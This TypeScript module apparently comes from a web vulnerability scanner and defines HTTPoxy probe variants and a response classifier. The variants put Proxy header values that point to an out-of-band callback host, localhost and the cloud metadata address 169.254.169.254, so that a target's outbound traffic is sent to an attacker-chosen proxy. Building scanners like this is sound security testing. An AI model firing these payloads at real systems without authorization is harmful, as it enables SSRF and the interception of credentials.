// Adapted from source-reference/vantix/secops/skills/ patterns.
// Rewritten in TypeScript. No runtime dependency on the vendored source.
import type { FamilyMetadata, OracleClassification, PayloadVariant, ProbeContext, ScannerResponseInput } from '../types';

export const META: FamilyMetadata = {
  id: 'httpoxy',
  family: 'cve-named',
  title: 'HTTPoxy — Proxy header CGI/PHP poisoning',
  severity: 'high',
  destructiveRisk: 'none',
  requiresOast: true,
  requiresBrowser: false,
  insertionPointKinds: ['header'],
  expectedSignals: ['oast-callback-confirmed', 'proxy-header-accepted', 'outbound-via-attacker-proxy'],
  cwe: [284],
};

export function variants(ctx: ProbeContext): PayloadVariant[] {
  const oastHost = ctx.oastBaseUrl ? new URL(ctx.oastBaseUrl).hostname : 'oast.pf.example';
  return [
    {
      id: 'httpoxy-basic-oast',
      family: 'cve-named',
      value: `http://${oastHost}:8080`,
      encoding: 'header-safe',
      intent: 'Proxy: attacker-host — CGI maps to HTTP_PROXY env var, app routes outbound traffic through us',
      requiresOast: true,
      destructiveRisk: 'none',
      expectedSignals: ['oast-callback-confirmed'],
    },
    {
      id: 'httpoxy-https-oast',
      family: 'cve-named',
      value: `https://${oastHost}:8443`,
      encoding: 'header-safe',
      intent: 'Proxy: https:// variant — HTTPS-capable proxy environments',
      requiresOast: true,
      destructiveRisk: 'none',
      expectedSignals: ['oast-callback-confirmed'],
    },
    {
      id: 'httpoxy-with-auth',
      family: 'cve-named',
      value: `http://pf:probe@${oastHost}:8080`,
      encoding: 'header-safe',
      intent: 'Proxy header with embedded credentials — credential exposure via OAST',
      requiresOast: true,
      destructiveRisk: 'none',
      expectedSignals: ['oast-callback-confirmed'],
    },
    {
      id: 'httpoxy-localhost',
      family: 'cve-named',
      value: 'http://127.0.0.1:1234',
      encoding: 'header-safe',
      intent: 'Proxy: localhost — SSRF via proxy poisoning to internal services',
      requiresOast: false,
      destructiveRisk: 'none',
      expectedSignals: ['proxy-header-accepted'],
    },
    {
      id: 'httpoxy-metadata',
      family: 'cve-named',
      value: 'http://169.254.169.254',
      encoding: 'header-safe',
      intent: 'Proxy: cloud metadata endpoint — SSRF to IMDSv1 via outbound proxy routing',
      requiresOast: false,
      destructiveRisk: 'none',
      expectedSignals: ['proxy-header-accepted'],
    },
    {
      id: 'httpoxy-x-forwarded-for',
      family: 'cve-named',
      value: `http://${oastHost}`,
      encoding: 'header-safe',
      intent: 'HTTPoxy combined with X-Forwarded-For to test proxy-unaware frameworks',
      requiresOast: true,
      destructiveRisk: 'none',
      expectedSignals: ['oast-callback-confirmed'],
    },
  ];
}

export function classify(
  resp: ScannerResponseInput,
  variant: PayloadVariant,
  baseline: ScannerResponseInput,
): OracleClassification {
  const evidence: string[] = [];
  let responseClass: OracleClassification['responseClass'] = 'neutral-or-not-parsed';
  let confidence = 0.1;
  let nextAction: OracleClassification['nextAction'] = 'continue';

  if (variant.requiresOast) {
    responseClass = 'neutral-or-not-parsed';
    confidence = 0.2;
    nextAction = 'continue';
    evidence.push('HTTPoxy probe dispatched — awaiting outbound proxy connection on OAST');
  } else if (resp.statusCode !== baseline.statusCode) {
    responseClass = 'status-delta';
    confidence = 0.45;
    nextAction = 'confirm';
    evidence.push(`Status delta ${baseline.statusCode}→${resp.statusCode} — proxy header may have altered outbound routing`);
  } else if (resp.responseTimeMs > baseline.responseTimeMs + 3000) {
    responseClass = 'timing-delta';
    confidence = 0.55;
    nextAction = 'confirm';
    evidence.push('Timing delta — outbound request may be routing through injected proxy');
  } else {
    nextAction = 'stop-negative';
    evidence.push('No HTTPoxy signal — application may not be CGI-based or Proxy header is stripped');
  }

  return { payloadVariantId: variant.id, responseClass, confidence, evidence, nextAction };
}
